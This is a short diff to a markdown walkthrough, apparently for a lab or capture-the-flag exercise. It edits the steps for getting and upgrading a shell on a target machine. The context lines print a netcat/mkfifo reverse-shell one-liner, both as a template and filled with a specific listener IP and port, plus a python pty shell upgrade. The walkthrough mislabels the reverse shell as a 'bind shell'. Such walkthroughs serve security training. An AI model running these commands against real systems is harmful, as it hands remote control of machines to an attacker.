@@ -231,6 +231,8 @@ Start a netcat listener in the other pane, using the port in the reverse shell.
 The bind shell pattern:  
 `:> rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|<SHELL> -i 2>&1 |nc <ATTACKER IP> <PORT> >/tmp/f`  
 
+The bins shell for this environment:  
+
 `:> rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1 |nc 10.6.15.233 4444 >/tmp/f`
 
 Enter the bind shell command on the target device and check the identity of the user.
@@ -245,7 +247,7 @@ Identify available python with the `which` command
 
 Upgrade to an interactive shell:  
 
-`python -c ‘import pty; pty.spawn(“/bin/bash”)’`
+`:> python -c ‘import pty; pty.spawn(“/bin/bash”)’`
 
 ### Switch user  
 
